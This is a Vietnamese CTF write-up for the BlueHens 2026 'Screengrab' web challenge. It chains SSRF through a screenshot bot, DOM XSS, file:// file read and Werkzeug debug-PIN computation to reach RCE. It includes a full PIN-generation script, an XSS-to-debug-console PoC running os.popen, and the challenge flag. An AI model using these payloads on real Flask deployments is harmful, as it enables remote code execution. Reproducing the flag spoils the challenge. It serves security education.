---
title: "Screengrab"
slug: "bluehens-2026-screengrab"
platform: "BlueHens CTF 2026"
difficulty: "Medium"
vulnerabilities: ["Cross-Site Scripting","Local File Read","Debug Console Exposure"]
publishedAt: "2026-09-14"
summary: "Theo dõi các bước phân tích chức năng chụp trang web và môi trường Flask trong Screengrab."
draft: false
sortOrder: 7
---
`#web`  `#ssrf` `#xss` `#browser`
## Overview
```Text=
/app
├── /
│   └── render giao diện chính, nhận query param title và url
├── /api
│   ├── /data
│   └── /screenshot?url=...
├── /static
│   └── frontend build output
├── /read_flag
└── /flag.txt
```
Challenge có 3 thành phần chính:
- **frontend**: cho phép user nhập `title` và `url` sau đó hiển thị bài post gồm tiêu đề và screen shot của url được cung cấp
- **backend API**: cup cấp endpoint `/api/screenshot` và sử dụng Chromium headless để mở URL đầu vào
- **privileged target**: tồn tại flag.txt bị giới hạn quyền truy cập và một binary `read_flag` chạy với quyền cao hơn mục tiêu cuối của challenge
## Source code analysis
1. **app/app.py**
![image](https://hackmd.io/_uploads/BJNyMLLTbx.png)
=> app có server-side browser và mình điều khiển được url browser chạy JS rồi mới chạy có thể dẫn đến SSRF / browser pivot 
2. **app/fronted/src/App.js**
![image](https://hackmd.io/_uploads/HkIXD88Tbx.png)
![image](https://hackmd.io/_uploads/SkyNPULTWe.png)
=> Tổng hợp 2 đoạn trên ta có đây là gốc của **reflected XSS** query param `title` thì thành DOM XSS còn query param `url` thì đưa tới screenshotbot tức mình điều khiển cả input render frontend lẫn input server-side browser nãy mình nói ở trên
3. **app/Dockerfile**
![image](https://hackmd.io/_uploads/SkLn388p-l.png)
=> tóm lại somehow chạy được `read_flag`
4. **app/flag.c**
![image](https://hackmd.io/_uploads/By_Za8Uabx.png)
=> gần như không có gì hot tóm lai làm sao chạy được `read_flag` thôi
5. **app/app.py**
![image](https://hackmd.io/_uploads/Hk3E-_UpZl.png)
=> Tìm hiểu thêm lại **app.py**  ta phát hiện app chạy Flask debug mode mà debug mode bật built-in debugger cho phép thực thi Python code từ browser là cái ta còn thiếu để chạy `read_flag`
## Exploiting Chain and Flag
### Phase 1
Hiện tại ta đang xâu chuỗi được những bước sau từ source code:
1. Điều khiển input `title`,`url`
2. dùng url để ép screenshot bot đi vào `localhost`
3. khi bot vào internal app, dùng `title` nổ DOM XSS trong origin

![image](https://hackmd.io/_uploads/S1LPdu86-g.png)
Ta thử request như sau và xem kết quả ở trang chủ 
![image](https://hackmd.io/_uploads/HJEFO_L6be.png)
=> localhost access qua cái con bot này đã thành công rồi
Đến bước test DOM XSS
![image](https://hackmd.io/_uploads/S1D3oOIpWl.png)
![image](https://hackmd.io/_uploads/rJ2TiO8TZe.png)
Đoạn này phải cực kì chú url bởi vì nếu không encode payload đúng thì có thể bị url rơi ra ngoài thành thiếu url như này 
![image](https://hackmd.io/_uploads/By3N3uUabl.png)
Và cách đúng là:
1. encode payload `title` cho url bên trong
2. encode toàn bộ URL bên trong khi nhét vào param `url` của bên ngoài
### Phase 2
Ở trên ta đã nói rõ về con đường debug mode là đáng ngờ nhất để dẫn tới execution. Và để mở khóa Flask console -> ta phải lấy PIN để dùng được. Thật sự đây là bước khá khó và khó mới và phải thử khá nhiều cách mới ra. Từ Source code, ta xác định có hướng ổn nhất là build PIN và để build ta cần các bits sau:
1. Ta đã có các bits sau: username,modulename,class/app name, module __file__ (Có thể lấy từ source)
2. Các bit ẩn : `str(uuid.getnode())`(MAC dạng decimal) và `get_machine_id()`

Ở đây ta lợi dụng một lỗi **LFI** vì ở trong con bot nó dùng `page.goto(url)` mà k lọc scheme nên k nhận http nên file:// cũng đi qua được
Ta lấy `machine_id`:
![image](https://hackmd.io/_uploads/SyYyoFI6We.png)
Lấy MAC 
![image](https://hackmd.io/_uploads/BJq4TYU6bg.png)
Từ đây ta tạo ra PIN bằng đoạn code dưới đây
```python=
import hashlib
from itertools import chain

mac_addr = "76:b5:df:78:51:a7"
machine_id_raw = "186d16078e564464a35001079d92d"


mac_decimal = str(int(mac_addr.replace(":", ""), 16))

machine_id = machine_id_raw

probably_public_bits = [
    "user",  
    "flask.app",  
    "Flask",  
    "/usr/local/lib/python3.12/site-packages/flask/app.py", 
]

private_bits = [
    mac_decimal,
    machine_id,
]


h = hashlib.sha1()

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)

h.update(b"cookiesalt")
cookie_name = "__wzd" + h.hexdigest()[:20]

h.update(b"pinsalt")
num = ("%09d" % int(h.hexdigest(), 16))[:9]

rv = None
for group_size in (5, 4, 3):
    if len(num) % group_size == 0:
        rv = "-".join(
            num[x:x + group_size].rjust(group_size, "0")
            for x in range(0, len(num), group_size)
        )
        break
else:
    rv = num
print("[+] MAC address     :", mac_addr)
print("[+] MAC decimal     :", mac_decimal)
print("[+] Machine ID raw  :", machine_id_raw)
print("[+] Machine ID final:", machine_id)
print("[+] Cookie name     :", cookie_name)
print("[+] Debug PIN       :", rv)
```
Ta test ở local thì có vẻ PIN với cách tạo của ta đã đúng
![image](https://hackmd.io/_uploads/rJbf1q8aWl.png)
Tiếp theo
1. Có PIN rồi giờ ta sẽ lấy `SECRET` từ `/console` 
2. `pinauth`
3. gửi `cmd` để chạy `/app/read_flag`
4. in output để bot chụp
PoC cuối
```python=
import base64
import requests
from urllib.parse import quote

PIN = "806-228-080"
INSTANCE = "http://b68d9f407f65473da93293a42e26d462.cdeployer1.2485370.xyz"
INTERNAL = "http://127.0.0.1:1337"


def build_js(pin: str) -> str:
    return f"""
(()=>{{
  var x = new XMLHttpRequest();
  x.open('GET', '{INTERNAL}/console', false);
  x.send();

  var m = x.responseText.match(/SECRET\\s*=\\s*["']([^"']+)["']/);
  if (!m) {{
    document.body.innerHTML =
      '<pre style="font-size:20px;white-space:pre-wrap">[step1] Failed to extract SECRET\\n\\nHTTP ' +
      x.status + '\\n\\n' + x.responseText.replace(/</g, '&lt;') + '</pre>';
    return;
  }}

  var s = m[1];

  var y = new XMLHttpRequest();
  y.open(
    'GET',
    '{INTERNAL}/console?__debugger__=yes&cmd=pinauth&pin=' +
      encodeURIComponent('{pin}') + '&s=' + encodeURIComponent(s),
    false
  );
  y.send();

  var cmd = encodeURIComponent("__import__('os').popen('/app/read_flag').read()");
  var z = new XMLHttpRequest();
  z.open(
    'GET',
    '{INTERNAL}/console?__debugger__=yes&cmd=' + cmd + '&frm=0&s=' + encodeURIComponent(s),
    false
  );
  z.send();

  document.body.innerHTML =
    '<pre style="font-size:32px;color:red;white-space:pre-wrap">' +
    z.responseText.replace(/</g, '&lt;') +
    '</pre>';
}})()
""".strip()


def build_payload(js: str) -> str:
    b64 = base64.b64encode(js.encode()).decode()
    return f"<img src=x onerror=eval(atob('{b64}'))>"


def build_internal_target(payload: str) -> str:
    return f"{INTERNAL}/?title={quote(payload)}&url=about:blank"


def main():
    js = build_js(PIN)
    payload = build_payload(js)
    internal_target = build_internal_target(payload)

    print("[*] Internal target:")
    print(internal_target)

    print("\n[*] Submit manually to:")
    print(f"{INSTANCE}/")

    print("\n[*] Or send directly to API:")
    api = f"{INSTANCE}/api/screenshot"
    r = requests.post(api, json={"url": internal_target}, timeout=30)

    print("\n[*] Status:", r.status_code)
    print(r.text)


if __name__ == "__main__":
    main()
```
![image](https://hackmd.io/_uploads/Bk0LvqI6Wl.png)
flag: **UDCTF{f1l3_r3Ad_2_rCe_v14_flask_d3bug_m0d3}**